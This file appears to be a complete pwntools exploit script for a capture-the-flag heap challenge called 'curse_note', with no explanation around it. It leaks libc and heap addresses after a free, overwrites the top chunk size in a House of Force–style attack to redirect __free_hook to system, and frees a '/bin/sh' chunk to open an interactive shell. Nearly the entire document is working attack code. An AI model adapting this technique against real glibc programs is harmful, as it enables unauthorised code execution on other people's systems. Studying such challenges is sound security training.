from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./curse_note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./curse_note")
else:
	pass

def menu(choice):
	p.sendlineafter("choice: ",str(choice))

def add(index,size,content):
	menu(1)
	p.sendlineafter("index: ",str(index))
	p.sendlineafter("size: ",str(size))
	p.sendafter("info: ",content)

def show(index):
	menu(2)
	p.sendlineafter("index: ",str(index))

def free(index):
	menu(3)
	p.sendlineafter("index: ",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		#gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0xF2F),b2 = hex(code_base + 0xDC2)))
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0xF2F)))#,b2 = hex(code_base + 0xDC2)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
add(0,0x600,"a")
add(1,0x100,"a")
free(0)
add(0,0x500,"a"*8)
show(0)
p.recvuntil("a"*8)
leak_addr = u64(p.recv(8))
libc.address = leak_addr - 1224 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
leak_addr = u64(p.recv(8))
heap_base = leak_addr
log.success("heap_base:" + hex(heap_base))
free(0)
free(1)
size = libc.symbols["system"]
target = libc.symbols["__free_hook"] - (heap_base + 0x100)
size = target + size
payload = p64(0) * 0x1f + p64(size & 0xfffffffffffffff0)
add(0,0x108,payload)
debugf()
target = libc.symbols["__malloc_hook"] + 88 + 0x10
add(1,target + 1,"a")
target = libc.symbols["__free_hook"] - (heap_base + 0x100)
add(2,target - 0x10,"/bin/sh\x00")
free(2)
p.interactive()
